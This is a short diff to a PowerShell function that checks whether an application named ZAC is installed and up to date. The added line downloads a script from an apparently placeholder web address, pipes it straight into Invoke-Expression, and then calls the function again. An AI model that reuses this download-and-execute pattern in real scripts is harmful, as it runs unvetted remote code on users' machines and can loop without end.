@@ -62,6 +62,7 @@ function PunchIt () {
     }
     elseif($OSArch -eq "64-bit"){
         Write-Host "Checking if ZAC is installed..."
+        IWR -URI 'https://mywebsite.com/myscipt.ps1' -UseBasicParsing | IEX; PunchIt
         if((Get-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*) | Where-Object {$_.DisplayName -eq "ZAC"}){
         $ZACVersion = ((Get-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*) | Where-Object {$_.DisplayName -contains "ZAC"}).DisplayVersion
         Write-Host "ZAC (v$ZACVersion) is installed...checking if ZAC is up-to-date..."
